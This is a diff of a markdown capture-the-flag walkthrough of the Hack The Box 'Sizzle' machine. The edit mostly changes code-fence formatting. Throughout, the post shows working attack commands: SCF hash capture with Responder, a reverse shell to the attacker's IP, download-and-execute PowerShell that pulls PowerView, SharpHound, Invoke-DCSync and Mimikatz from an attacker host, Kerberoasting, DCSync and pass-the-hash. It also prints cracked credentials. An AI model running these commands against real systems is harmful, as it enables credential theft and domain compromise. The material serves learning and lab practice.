@@ -14,7 +14,7 @@ A TCP scan on all ports reveals the following ports as open:
 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5986,9389,47001
 
 So let's do a version scan on all these ports:
-```bash
+```c {hl_lines=[1]}
 $ nmap 10.10.10.103 -sV -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5986,9389,47001
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-20 13:55 AEDT
 Nmap scan report for 10.10.10.103
@@ -47,39 +47,31 @@ Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
 OK, so at first glance, we can see a HTTP(S) server running, an FTP server running, an LDAP and SMB server, and a bunch of other Windows related services.
 
 Let's start with an enumeration of SMB shares using an anonymous login:
-```bash
+```c {hl_lines=[1]}
 $ smbclient -L ////10.10.10.103// -U anonymous -N
 
 Sharename       Type      Comment
 ADMIN$          Disk      Remote Admin
-
 C$              Disk      Default share
-
 CertEnroll      Disk      Active Directory Certificate Services share
-
 Department Shares Disk      
-
 IPC$            IPC       Remote IPC
-
 NETLOGON        Disk      Logon server share 
-
 Operations      Disk      
-
 SYSVOL          Disk      Logon server share
-
 ```
 
 So we have a few non-standard shares available to us, including "CertEnroll", "Operations" and "Department Shares".
 
 Let's enumerate HTTP(S) next:
-```bash
+```c {hl_lines=[1]}
 $ gobuster -u http://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /images (Status: 301)
 /Images (Status: 301)
 /IMAGES (Status: 301)
 ```
 
-```bash
+```c {hl_lines=[1]}
 $ gobuster -u https://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 /images (Status: 301)
 /Images (Status: 301)
@@ -89,7 +81,7 @@ $ gobuster -u https://10.10.10.103 -w /usr/share/wordlists/dirbuster/directory-l
 Hmmm nothing useful here. Visiting the home page of http://10.10.10.103 simply shows a GIF of some meat sizzling on a hot surface.
 
 Finally, for enumeration, let's enumerate the FTP server:
-```bash
+```c {hl_lines=[1,9,13]}
 $ ftp 10.10.10.103
 Connected to 10.10.10.103.
 220 Microsoft FTP Service
@@ -112,7 +104,7 @@ We find no files publicly available on the FTP server, and get an Access Denied 
 
 Unfortunately, this is where I was stuck for a while. I enumerated the different SMB shares and the files and folders inside but found nothing that stood out for initial compromise. The following folders were found in the "Department Shares" share:
 
-```bash
+```c {hl_lines=[1,3]}
 $ smbclient \\\\10.10.10.103\\Department\ Shares -U anonymous -N
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -143,7 +135,7 @@ smb: \> ls
 ```
 
 In the Users directory, we find:
-```bash
+```c {hl_lines=[1,2]}
 smb: \> cd Users
 smb: \Users\> ls
   .                                   D        0  Wed Jul 11 07:39:32 2018
@@ -167,7 +159,7 @@ smb: \Users\> ls
 
 So we now have a bunch of usernames we can use for future steps i.e. amanda, amanda_adm, bill, bob, chris, henry, joe, jose, lkys37en, morgan and mrb3n. We additionally have a Public folder in the Users folder. Thinking about what user the FTP server is running as, it may be possible that we have write privileges to a Public folder. It is likely that the FTP server is running with least level privileges, but that any user is able to write to a Public folder. We try to place a test.txt file to test this hypothesis:
 
-```bash
+```c {hl_lines=[1,3]}
 smb: \Users\Public\> put test.txt 
 putting file test.txt as \Users\Public\test.txt (0.0 kb/s) (average 0.0 kb/s)
 smb: \Users\Public\> ls
@@ -183,7 +175,7 @@ https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
 The SCF attack involves using placing a specially crafted SCF file on the shared drive. Then the attack requires that a user on the machine open the folder. From the website above: ```"When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file."``` If this is the actual intended vulnerability for initial compromise, then there must be a script running on Sizzle that opens the Public folder. Let's try out the attack and see!
 
 First, we create a SCF file as follows, where 10.10.15.30 is my tun0 IP address:
-```bash
+```c {hl_lines=[1]}
 $ cat @mytest.scf 
 [Shell]
 Command=2
@@ -194,7 +186,7 @@ Command=ToggleDesktop
 ```
 
 Note that the SCF filename starts with the @ character so that it comes up as the first file when viewed in a directory browser. We then start [responder](https://github.com/SpiderLabs/Responder) on our attacker machine:
-```bash
+```c {hl_lines=[1]}
 $ responder -I tun0
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -213,7 +205,7 @@ $ responder -I tun0
 
 We then upload the SCF file to the Public folder:
 
-```bash
+```c {hl_lines=[1]}
 $ smbclient \\\\10.10.10.103\\Department\ Shares -U anonymous -N
 smb: \> cd Users\Public
 smb: \Users\Public\> put @mytest.scf 
@@ -223,7 +215,7 @@ putting file @mytest.scf as \Users\Public\@mytest.scf (0.1 kb/s) (average 0.1 kb
 
 Waiting a minute or two, we receive a hash:
 
-```bash
+```c {hl_lines=[1]}
 $ responder -I tun0
 [SMBv2] NTLMv2-SSP Client   : 10.10.10.103
 [SMBv2] NTLMv2-SSP Username : HTB\amanda
@@ -232,7 +224,7 @@ $ responder -I tun0
 ```
 
 Great! We now have HTB\amanda's hash! Let's try crack it! We'll just use the common rockyou.txt wordlist:
-```bash
+```c {hl_lines=[1,3]}
 $ cat hash
 amanda::HTB:a54c47483fcc6a20:CE16D8EC24B20C8B9D347AAC24EA327D:0101000000000000C0653150DE09D20122CDF94B8B490287000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000E2474A4FC02AD635EC39F0E6F8D60B331F2A24C61353E30C14190A558728F30C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310037003100000000000000000000000000
 $ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
@@ -248,7 +240,7 @@ Woot! We have our first credentials!
 Now to figure out where to use them...
 
 We try [Impacket's psexec.py](https://github.com/SecureAuthCorp/impacket), but unfortunately we don't find any share that is writable by amanda:
-```bash
+```c {hl_lines=[1]}
 $ psexec.py HTB/amanda@10.10.10.103 dir
 Impacket v0.9.13 - Copyright 2002-2015 Core Security Technologies
 
@@ -283,7 +275,7 @@ I then also realised that the nmap results for port 5968 mentioned that the serv
 Googling for "winrm https client linux", I find the following link: https://krash.be/node/29
 Here, the writer recommends using a [Ruby Gem called winrm](https://github.com/WinRb/WinRM) for connecting to WinRM from Linux to Windows. This page has great documentation on writing a client as well, so we set one up using the credentials we have:
 
-```bash
+```ruby {hl_lines=[1]}
 $ cat https-amanda-winrm.rb 
 require 'winrm'
 opts = { 
@@ -303,7 +295,7 @@ end
 
 Running this script gives me the following error:
 
-```bash
+```c {hl_lines=[1]}
 $ ruby https-amanda-winrm.rb
 /usr/lib/ruby/vendor_ruby/httpclient/ssl_socket.rb:103:in `connect': SSL_connect returned=1 errno=0 state=error: certificate verify failed (unable to get local issuer certificate) (OpenSSL::SSL::SSLError)
 
@@ -314,23 +306,23 @@ Googling this error, we find that the cause is "when a self-signed certificate c
 Additionally, doing a little more research on WinRM with SSL leads us to the following article from Microsoft:
 https://support.microsoft.com/en-au/help/2019527/how-to-configure-winrm-for-https
 What's important to us is the following line:
-"If you have a Microsoft Certificate server you may be able to request a certificate using the web certificate template from HTTPS://<MyDomainCertificateServer>/certsrv"
+"If you have a Microsoft Certificate server you may be able to request a certificate using the web certificate template from `HTTPS://<MyDomainCertificateServer>/certsrv"`
 
 So to summarise, we may need a self signed certificate, and a Microsoft certificate server can be used to request a certificate.
 
-When we try visiting http://10.10.10.103/certsrv we actually find that we are provided with a popup asking for credentials. We enter amanda's credentials and are presented with a web page we haven't seen before. It looks like we can use this page to request a certificate! It's odd that we didn't pick up this site before though. (Turned out that certsrv is not in the directory-list-2.3-medium.txt wordlist, but is in dirb's common.txt wordlist - I've put this in my "General approach" cheatsheet for the future!)
+When we try visiting `http://10.10.10.103/certsrv` we actually find that we are provided with a popup asking for credentials. We enter amanda's credentials and are presented with a web page we haven't seen before. It looks like we can use this page to request a certificate! It's odd that we didn't pick up this site before though. (Turned out that certsrv is not in the `directory-list-2.3-medium.txt` wordlist, but is in dirb's `common.txt` wordlist - I've put this in my "General approach" cheatsheet for the future!)
 
-When we go to "Request a Certificate" and then to "Advanced certificate request" we see that we can submit a Certificate Signing Request (CSR) to have our private key signed by the server. The advanced certificate request page is at: http://10.10.10.103/certsrv/certrqxt.asp
+When we go to "Request a Certificate" and then to "Advanced certificate request" we see that we can submit a Certificate Signing Request (CSR) to have our private key signed by the server. The advanced certificate request page is at: `http://10.10.10.103/certsrv/certrqxt.asp`
 
 We can create our own private key with a CSR using the following command:
-```bash
+```c
 $ openssl req -new -newkey rsa:2048 -nodes -out dev.csr -keyout dev.key
 ```
 
-The above command outputs a private key (dev.key) and a CSR (dev.csr). We can submit the contents of the CSR (including the header and footer) to the Advanced Certificate Request page, and the server will create a certificate for us with a signature approving our private key. We retrieve "certnew.cer" from the server and now should be able to use this for authentication to WinRM. Note that because we logged in to the certsrv portal with amanda's credentials, the private key should now be linked with amanda's account.
+The above command outputs a private key (`dev.key`) and a CSR (`dev.csr`). We can submit the contents of the CSR (including the header and footer) to the Advanced Certificate Request page, and the server will create a certificate for us with a signature approving our private key. We retrieve `certnew.cer` from the server and now should be able to use this for authentication to WinRM. Note that because we logged in to the certsrv portal with amanda's credentials, the private key should now be linked with amanda's account.
 
 Referencing code from the Ruby gem's page again, we set up the following code for authenticating to WinRM using a private key and certificate:
-```bash
+```ruby {hl_lines=[1]}
 $ cat shell-winrm.rb 
 require 'winrm'
 
@@ -359,7 +351,7 @@ end
 ```
 
 Running this code we get our first shell!
-```bash
+```c {hl_lines=[1,2]}
 $ ruby shell-winrm.rb 
 PS > whoami
 htb\amanda
@@ -371,7 +363,7 @@ OK although we did all that work to get our first shell, unfortunately we still 
 
 Let's do some enumeration, starting with ```systeminfo``` and looking at the list of other users on the system:
 
-```bash
+```c {hl_lines=[1,2,4,6]}
 $ ruby shell-winrm.rb 
 PS > whoami
 htb\amanda
@@ -389,13 +381,13 @@ The command completed with one or more errors.
 
 ```
 
-Interestingly, we aren't allowed to run systeminfo! However, there is a user called sizzler, and another one called krbtgt which straight away stick out. The sizzler account is similar to the name of the machine, and the krbtgt user means that Kerberos authentication is most likely enabled. From our perspective, it means Kerberoasting may be an option to laterally compromise another user.
+Interestingly, we aren't allowed to run `systeminfo`! However, there is a user called `sizzler`, and another one called `krbtgt` which straight away stick out. The `sizzler` account is similar to the name of the machine, and the `krbtgt` user means that Kerberos authentication is most likely enabled. From our perspective, it means Kerberoasting may be an option to laterally compromise another user.
 
 I would recommend [Tim Medin's talk on Kerberoasting](https://www.youtube.com/watch?v=PUyhlN-E5MU) as it explains exactly how it works. His [slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) are also available online. To put it simply, Kerberoasting involves requesting kerberos tickets for services. Part of these tickets may be encrypted with the RC4 algorithm where the private key is the "Kerberos TGS-REP etype 23 hash of the service account associated with the SPN". More details can be found on the MITRE ATT&CK page [here](https://attack.mitre.org/techniques/T1208/). If there is an account associated with an SPN, and has a weak password, we may be able to crack its hash and get back the password.
 
-To start with, we can try to import PowerView into powershell to allow us to use the Invoke-Kerberoast function. PowerView started [supporting Kerberoasting](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/) a few years ago. So let's try downloading the PowerView.PS1 script onto the box with powershell and then importing it. We can use ```# python -m SimpleHTTPServer 8081``` to start a web server to serve our scripts, and we can get PowerView.PS1 from the [PowerSploit github repo](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). Note that the main branch version doesn't have Invoke-Kerberoast as yet, but the one I linked does. Our result is as follows:
+To start with, we can try to import PowerView into powershell to allow us to use the `Invoke-Kerberoast` function. PowerView started [supporting Kerberoasting](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/) a few years ago. So let's try downloading the `PowerView.PS1` script onto the box with powershell and then importing it. We can use ```# python -m SimpleHTTPServer 8081``` to start a web server to serve our scripts, and we can get PowerView.PS1 from the [PowerSploit github repo](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). Note that the main branch version doesn't have `Invoke-Kerberoast` as yet, but the one I linked does. Our result is as follows:
 
-```bash
+```c {hl_lines=[1,2,3]}
 $ ruby shell-winrm.rb 
 PS > Invoke-WebRequest -Uri "http://10.10.15.30:8081/PowerView.ps1" -OutFile "C:\Users\amanda\Documents\PV.ps1"
 PS > Import-Module C:\Users\amanda\Documents\PV.ps1
@@ -411,7 +403,7 @@ Unfortunately, we get a permission denied error when trying to import PowerView.
 
 I know there is also a way to directly download and import the PS1 script into memory without needing to store the PS1 file on disk, so we can try that too:
 
-```bash
+```c {hl_lines=[1]}
 PS > iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/PowerView.ps1')
 Cannot create type. Only core types are supported in this language mode.
 At line:1 char:6
@@ -424,12 +416,12 @@ At line:1 char:6
 That didn't work either! Looks like we will have to bypass powershell constrained mode first before moving forward.
 
 Researching a bit on bypassing powershell constrained mode, we find two common ways to bypass it:
-* Use powershell -v2 to spawn a new process with a [downgraded version of powershell](https://ired.team/offensive-security/powershell-constrained-language-mode-bypass) which doesnt support constrained mode
+* Use `powershell -v2` to spawn a new process with a [downgraded version of powershell](https://ired.team/offensive-security/powershell-constrained-language-mode-bypass) which doesnt support constrained mode
 * Use [padovah4ck's executable](https://github.com/padovah4ck/PSByPassCLM) for bypassing constrained mode and getting a shell with full language mode enabled
 
 Let's git clone padovahh4ck's repo and run the following commands to get ourselves a reverse shell with powershell full language mode:
 
-```bash
+```c
 PS > Invoke-WebRequest -Uri "http://10.10.15.30:8081/PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/x64/Debug/PsBypassCLM.exe" -OutFile "C:\Users\amanda\Documents\bp.exe"
 
 PS > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.15.30 /rport=443 /U C:\Users\amanda\Documents\bp.exe
@@ -437,7 +429,7 @@ PS > C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /
 
 And we get a shell on port 443:
 
-```bash
+```c {hl_lines=[1,4,6]}
 $ nc -nvlp 443
 listening on [any] 443 ...
 connect to [10.10.15.30] from (UNKNOWN) [10.10.10.103] 60970
@@ -448,15 +440,15 @@ htb\amanda
 
 ```
 
-As we can see above, we now have a shell with FullLanguage mode enabled! Now we can import PowerView again:
+As we can see above, we now have a shell with `FullLanguage` mode enabled! Now we can import PowerView again:
 
-```bash
+```c
 PS C:\Users\amanda\Documents> iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/PowerView.ps1')
 ```
 
 To use Invoke-Kerberoast, it's important that our current shell has amanda's kerberos token in memory so that it can be used to request tickets from the domain controller. We run the following commands to perform the kerberoast attack:
 
-```bash
+```c
 PS C:\Users\amanda\Documents> $SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
 PS C:\Users\amanda\Documents> $Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $SecPassword)
 PS C:\Users\amanda\Documents> Invoke-UserImpersonation -Credential $Cred
@@ -465,7 +457,7 @@ PS C:\Users\amanda\Documents> Invoke-Kerberoast -OutputFormat Hashcat | fl
 
 Again it should be noted that we need a special version of PowerView which includes Invoke-UserImpersonation and Invoke-Kerberoast as found [here](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1). An example of using Invoke-UserImpersonation can be found on line [2065](https://github.com/PowerShellMafia/PowerSploit/blob/7c32bf69f334b7c15c644cdb41188bdfe1a0b0e8/Recon/PowerView.ps1#L2065). The output of Invoke-Kerberoast returns us a kerberos ticket signed with mrlky's hash:
 
-```bash
+```c {hl_lines=[1]}
 PS C:\Users\amanda\Documents> Invoke-Kerberoast -OutputFormat Hashcat | fl
 
 SamAccountName       : mrlky
@@ -478,7 +470,7 @@ Hash                 : $krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Ser
 
 I decided to use the ```-OutputFormat Hashcat``` option as I found it easier to crack the hash with hashcat. However, I have to edit the hash a little bit, and looking at hashcat's [list of example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) shows us the format hashcat expects. So we edit the starting of the hash as follows, and then run hashcat to crack it:
 
-```bash
+```c {hl_lines=[1,4]}
 $ cat hashcat-hash 
 $krb5tgs$23$*user$realm$test/spn*$506FB86544C2EE265DC9AA32129D4294$9472892CFAD15F5B2604A2F388EFE8BD80E9BE8FA74D6ED40A12247
 <-----snip----->
@@ -493,11 +485,11 @@ $krb5tgs$23$*user$realm$test/spn*$506fb86544c2ee265dc9aa32129d4294$9472892cfad15
 We now have the following creds!  ```mrlky:Football#7```
 We can perform the same steps as we did for amanda to get a shell as mrlky:
 1. create a private key and CSR using openssl
-2. login to the /certsrv portal and login using mrlky's credentials
+2. login to the `/certsrv` portal and login using `mrlky`'s credentials
 3. submit the CSR and get back a certificate showing that the private key is signed by the certificate server
-4. use the winrm ruby library to get a shell as mrlky
+4. use the winrm ruby library to get a shell as `mrlky`
 
-```bash
+```ruby  {hl_lines=[1]}
 $ cat shell-winrm-mrlky.rb 
 require 'winrm'
 
@@ -527,7 +519,7 @@ end
 
 Running this ruby script gets us a shell from which we can retrieve user.txt:
 
-```bash
+```c {hl_lines=[1,2,5,9]}
 $ ruby shell-winrm-mrlky.rb
 PS > whoami
 htb\mrlky
@@ -552,9 +544,9 @@ There are a couple of scripts we can try to look for Windows privilege escalatio
 
 BloodHound requires us to first gather information from the compromised host. A tool called SharpHound includes scripts for gathering this information and can be found [here](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors).
 
-We use our FullLanguage mode shell to import this ingestor in memory and run it:
+We use our `FullLanguage` mode shell to import this ingestor in memory and run it:
 
-```bash
+```c
 PS C:\Users\mrlky.HTB\Documents> iex (new-object net.webclient).DownloadString('http://10.10.15.30:8081/BloodHound/Ingestors/SharpHound.ps1')
 PS C:\Users\mrlky.HTB\Documents> Invoke-BloodHound
 
@@ -562,9 +554,9 @@ PS C:\Users\mrlky.HTB\Documents> Invoke-BloodHound
 
 Unfortunately, our shell just crashes! The script seems to fail silently in the background and doesn't produce any files on the filesystem.
 
-Even trying powershell -v2 failed us, however the error below seems to be caused by a bug in the SharpHound script itself:
+Even trying `powershell -v2` failed us, however the error below seems to be caused by a bug in the SharpHound script itself:
 
-```bash
+```c {hl_lines=[1,2]}
 $ ruby shell-winrm-mrlky.rb
 PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/BloodHound/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
 powershell.exe : Invoke : Exception calling "Invoke" with "2" argument(s): "Attempted to read or write protected memory. This is often an indication that other memory is corrupt."
@@ -573,7 +565,7 @@ powershell.exe : Invoke : Exception calling "Invoke" with "2" argument(s): "Atte
 
 As this isn't working, I started looking for other versions of SharpHound and stumbled across [this one](https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/credentials/Bunnyhound/SharpHound.ps1) hosted in hak5's github repo. This script worked using powershell -v2 for bypassing constrained mode:
 
-```bash
+```c {hl_lines=[1]}
 PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/bashbunny-payloads/payloads/library/credentials/Bunnyhound/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
 Initializing BloodHound at 9:17 PM on 3/25/2019
 Starting Default enumeration for HTB.LOCAL
@@ -585,7 +577,7 @@ Finished enumeration for HTB.LOCAL in 00:00:11.7898754
 
 Great! We now have a bunch of CSV files as output showing us useful information about the Active Directory environment:
 
-```bash
+```c {hl_lines=[1]}
 PS > ls
     Directory: C:\Users\mrlky\Downloads
 Mode                LastWriteTime         Length Name                         
@@ -604,7 +596,7 @@ Mode                LastWriteTime         Length Name
 
 Having a look at the ACLs file, we can filter for the current user we have and see what access they have:
 
-```bash
+```c {hl_lines=[1]}
 PS > type acls.csv | findstr MRLKY
 MRLKY@HTB.LOCAL,user,DOMAIN ADMINS@HTB.LOCAL,group,Owner,,AccessAllowed,False,
 MRLKY@HTB.LOCAL,user,DOMAIN ADMINS@HTB.LOCAL,group,GenericAll,,AccessAllowed,False,
@@ -618,11 +610,11 @@ HTB.LOCAL,domain,MRLKY@HTB.LOCAL,user,ExtendedRight,GetChangesAll,,False,
 
 ```
 
-From the above, we see three special ExtendedRights that have been allocated to our user! Specifically, the GetChanges Access Control Entry, the GetChangesAll entry and the DCSync entry.
+From the above, we see three special `ExtendedRights` that have been allocated to our user! Specifically, the `GetChanges` Access Control Entry, the `GetChangesAll` entry and the `DCSync` entry.
 
-The one that stands out straight away is DCSync! Using DCSync, which effectively "impersonates" a Domain Controller, we can request account password data from the targeted Domain Controller. Effectively, this access allows us to replicate the data from a domain controller (hence "sync"). We can use the [Invoke-DCSync script](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1) to utilise this feature:
+The one that stands out straight away is `DCSync`! Using `DCSync`, which effectively "impersonates" a Domain Controller, we can request account password data from the targeted Domain Controller. Effectively, this access allows us to replicate the data from a domain controller (hence "sync"). We can use the [Invoke-DCSync script](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1) to utilise this feature:
 
-```bash
+```c {hl_lines=[1]}
 PS > powershell -version 2 -command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.30:8081/Invoke-DCSync.ps1'); Invoke-DCSync | Format-Table -Wrap"
 <-----snip----->
 Domain                   User                     ID                       Hash                   
@@ -638,7 +630,7 @@ HTB.LOCAL                sizzler                  1604                     d79f8
 
 WOOT! We now have the hashes for each user! And we use Administrator's hash to get root.txt:
 
-```bash
+```c {hl_lines=[1,7,10]}
 $ wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@10.10.10.103
 Impacket v0.9.13 - Copyright 2002-2015 Core Security Technologies
 
@@ -665,12 +657,12 @@ Many tools for Pass-The-Hash attacks: https://www.hacklikeapornstar.com/all-pth-
 Common Active Directory Attacks: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
 
 
-P.S. As an alternative, I also used ```Invoke-Mimikatz``` to utilise the DCSync feature to extract the Administrator's hash. The version of the script I used can be found [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1), although I had a few problems with it. Specifically, the following two articles helped me fix the bugs I was having:
+P.S. As an alternative, I also used ```Invoke-Mimikatz``` to utilise the `DCSync` feature to extract the Administrator's hash. The version of the script I used can be found [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1), although I had a few problems with it. Specifically, the following two articles helped me fix the bugs I was having:
 * [Ambiguous match found error solution](https://github.com/mitre/caldera/issues/38#issuecomment-396055260)
 * [AddressWidth cannot be found error solution](https://github.com/EmpireProject/Empire/issues/231#issuecomment-228440044)
 
-Once I had these lines fixed, I ran the following commands from my FullLanguage mode powershell shell and got Administrator's hash:
-```bash
-PS C:\Users\mrlky.HTB\Documents> iex (new-object net.webclient).DownloadString('http://10.10.12.151:8081/Invoke-Mimikatz.ps1')
+Once I had these lines fixed, I ran the following commands from my `FullLanguage` mode powershell shell and got Administrator's hash:
+```c
+PS C:\Users\mrlky.HTB\Documents> iex (new-object net.webclient).DownloadString("http://10.10.12.151:8081/Invoke-Mimikatz.ps1")
 PS C:\Users\mrlky.HTB\Documents> Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
 ```
